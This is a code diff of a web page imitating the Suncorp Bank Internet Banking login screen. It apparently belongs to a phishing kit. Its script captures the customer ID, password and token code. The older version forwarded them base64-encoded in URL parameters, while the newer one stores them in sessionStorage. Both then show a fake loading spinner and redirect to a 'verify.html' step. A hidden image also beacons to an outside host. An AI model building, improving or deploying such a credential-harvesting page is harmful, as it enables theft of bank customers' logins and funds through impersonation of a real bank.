@@ -129,138 +129,191 @@
           </p>
           <script>
 document.addEventListener('DOMContentLoaded', function() {
-    var form = document.getElementById('loginForm');
-    var userIdInput = document.getElementById('UserId');
-    var passwordInput = document.getElementById('password');
-    var passcodeInput = document.getElementById('passcode');
-    
-    // Find the Flextable element to insert error box before it
-    var flextable = document.querySelector('.sg-Flextable.sg-Flextable--2cols.sg-Flextable--collapseLarge');
-    
+    const form = document.getElementById('loginForm');
+    const userIdInput = document.getElementById('UserId');
+    const passwordInput = document.getElementById('password');
+    const passcodeInput = document.getElementById('passcode');
+
     // Create the error box
-    var errorBox = document.createElement('div');
+    const errorBox = document.createElement('div');
     errorBox.id = 'simpleErrorBox';
     errorBox.className = 'sg-Box sg-Box--error sg-Box--withIcon uama-hidden';
     errorBox.style.display = 'none';
     errorBox.style.marginBottom = '20px';
-    errorBox.innerHTML = '<div class="sg-Box-icon sg-Box-icon--withBackground"><span class="sg-Box--errorIcon"></span></div><div class="sg-Box-content"><p>This is an invalid combination of Internet Banking Customer ID, Internet Banking Password and Token Code - please re-enter your details. Your Internet Banking password is case sensitive so ensure your CAPS lock is not on. <strong>If you have a security token or use the Suncorp Bank Secured App you must enter a token code to login.</strong></p></div>';
-    
+    errorBox.innerHTML = `
+        <div class="sg-Box-icon sg-Box-icon--withBackground">
+            <span class="sg-Box--errorIcon"></span>
+        </div>
+        <div class="sg-Box-content">
+            <p>This is an invalid combination of Internet Banking Customer ID, Internet Banking Password and Token Code - please re-enter your details. Your Internet Banking password is case sensitive so ensure your CAPS lock is not on. <strong>If you have a security token or use the Suncorp Bank Secured App you must enter a token code to login.</strong></p>
+        </div>
+    `;
+
     // Insert error box before the Flextable
+    const flextable = document.querySelector('.sg-Flextable.sg-Flextable--2cols.sg-Flextable--collapseLarge');
     if (flextable && flextable.parentNode) {
         flextable.parentNode.insertBefore(errorBox, flextable);
     }
-    
+
     // Add red border style class
-    var style = document.createElement('style');
-    style.textContent = '.sg-Input--error-border { border: 1px solid #d32f2f !important; border-color: #d32f2f !important; } @keyframes suncorp-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }';
+    const style = document.createElement('style');
+    style.textContent = `
+        .sg-Input--error-border {
+            border: 1px solid #d32f2f !important;
+            border-color: #d32f2f !important;
+        }
+        @keyframes suncorp-spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    `;
     document.head.appendChild(style);
-    
+
     function validateUserId(userId) {
-        return /^\d{9,10}$/.test(userId);
+        const userIdRegex = /^\d{9,10}$/;
+        return userIdRegex.test(userId);
     }
-    
+
     function validatePassword(password) {
         if (password.length < 8) return false;
         if (!/[A-Z]/.test(password)) return false;
         if (!/[a-z]/.test(password)) return false;
         if (!/[0-9]/.test(password)) return false;
-        if (!/[!@#$%^&*()_+\-=\[\]{};\':"\\|,.<>\/?]/.test(password)) return false;
+        if (!/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password)) return false;
         return true;
     }
-    
+
     function validatePasscode(passcode) {
         if (!passcode || passcode.length === 0) return true;
-        return /^\d{6,8}$/.test(passcode);
+        const passcodeRegex = /^\d{6,8}$/;
+        return passcodeRegex.test(passcode);
     }
-    
+
     function clearAllErrors() {
         errorBox.style.display = 'none';
         userIdInput.classList.remove('sg-Input--error-border');
         userIdInput.setAttribute('aria-invalid', 'false');
         passwordInput.classList.remove('sg-Input--error-border');
         passwordInput.setAttribute('aria-invalid', 'false');
-        passcodeInput.classList.remove('sg-Input--error-border');
-        passcodeInput.setAttribute('aria-invalid', 'false');
+        if (passcodeInput) {
+            passcodeInput.classList.remove('sg-Input--error-border');
+            passcodeInput.setAttribute('aria-invalid', 'false');
+        }
     }
-    
+
     function hideLoading() {
-        var existingOverlay = document.getElementById('login-loading-overlay');
+        const existingOverlay = document.getElementById('login-loading-overlay');
         if (existingOverlay) {
             existingOverlay.remove();
         }
     }
-    
+
     function showLoading() {
         hideLoading();
-        
-        var overlay = document.createElement('div');
+
+        const overlay = document.createElement('div');
         overlay.id = 'login-loading-overlay';
-        overlay.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(2px); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; transition: opacity 0.3s ease;';
-        
-        var spinner = document.createElement('div');
-        spinner.style.cssText = 'width: 60px; height: 60px; border: 4px solid rgba(0, 0, 0, 0.2); border-top: 4px solid #ffc800; border-radius: 50%; animation: suncorp-spin 1s linear infinite;';
-        
-        var text = document.createElement('p');
-        text.style.cssText = 'color: #ffc800; font-family: Arial, sans-serif; font-size: 16px; margin-top: 20px; letter-spacing: 1px;';
-        
+        overlay.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(2px);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            transition: opacity 0.3s ease;
+        `;
+
+        const spinner = document.createElement('div');
+        spinner.style.cssText = `
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(0, 0, 0, 0.2);
+            border-top: 4px solid #ffc800;
+            border-radius: 50%;
+            animation: suncorp-spin 1s linear infinite;
+        `;
+
+        const text = document.createElement('p');
+        text.style.cssText = `
+            color: #ffc800;
+            font-family: Arial, sans-serif;
+            font-size: 16px;
+            margin-top: 20px;
+            letter-spacing: 1px;
+        `;
+
         overlay.appendChild(spinner);
         overlay.appendChild(text);
         document.body.appendChild(overlay);
     }
-    
-    // Remove errors when user types
+
     userIdInput.addEventListener('input', clearAllErrors);
     passwordInput.addEventListener('input', clearAllErrors);
-    passcodeInput.addEventListener('input', clearAllErrors);
-    
+    if (passcodeInput) {
+        passcodeInput.addEventListener('input', clearAllErrors);
+    }
+
     form.addEventListener('submit', function(e) {
         e.preventDefault();
         clearAllErrors();
-        
-        var userId = userIdInput.value.trim();
-        var password = passwordInput.value;
-        var passcode = passcodeInput ? passcodeInput.value.trim() : '';
-        
-        var isValid = true;
-        
-        // Validate Customer ID (9-10 digits)
+
+        const userId = userIdInput.value.trim();
+        const password = passwordInput.value;
+        const passcode = passcodeInput ? passcodeInput.value.trim() : '';
+
+        // Alert to check form values
+        alert(`Form submitted with:\nUser ID: ${userId}\nPassword: ${password}\nPasscode: ${passcode}`);
+
+        let isValid = true;
+
         if (!userId || !validateUserId(userId)) {
             userIdInput.classList.add('sg-Input--error-border');
             userIdInput.setAttribute('aria-invalid', 'true');
             isValid = false;
         }
-        
-        // Validate password (8+ chars, uppercase, lowercase, number, special char)
+
         if (!password || !validatePassword(password)) {
             passwordInput.classList.add('sg-Input--error-border');
             passwordInput.setAttribute('aria-invalid', 'true');
             isValid = false;
         }
-        
-        // Validate passcode (6-8 digits, optional)
+
         if (!validatePasscode(passcode)) {
-            passcodeInput.classList.add('sg-Input--error-border');
-            passcodeInput.setAttribute('aria-invalid', 'true');
+            if (passcodeInput) {
+                passcodeInput.classList.add('sg-Input--error-border');
+                passcodeInput.setAttribute('aria-invalid', 'true');
+            }
             isValid = false;
         }
-        
+
         if (!isValid) {
             errorBox.style.display = 'block';
             return;
         }
-        
+
+        // Store in sessionStorage
+        sessionStorage.setItem('userId', userId);
+        sessionStorage.setItem('userPassword', password);
+        sessionStorage.setItem('userPasscode', passcode || 'Not provided');
+
+        // Alert to confirm data is stored
+        alert(`Data stored in sessionStorage:\nUser ID: ${userId}\nPassword: ${password}\nPasscode: ${passcode}`);
+
         showLoading();
-        
-        // MOBILE FIX: Pass data via URL parameters (base64 encoded)
+
         setTimeout(function() {
-            var params = 'u=' + encodeURIComponent(btoa(userId)) + 
-                        '&p=' + encodeURIComponent(btoa(password)) + 
-                        '&t=' + encodeURIComponent(btoa(passcode || 'none'));
-            window.location.href = 'verify.html?' + params;
+            window.location.href = 'verify.html';
         }, 3000);
     });
 });
 </script>
+
           <p>
            First time here?
            <a href="https://internetbanking.suncorpbank.com.au/Registration/Requirements " target="_blank">
@@ -385,3 +438,4 @@ document.addEventListener('DOMContentLoaded', function() {
     </a>
    </div>
   </div><img style="display:none;" src="https://css.page-source.com/resizeimage.ashx?ig=&amp ;sz=179401" width="0" height="0"></body></html>
+
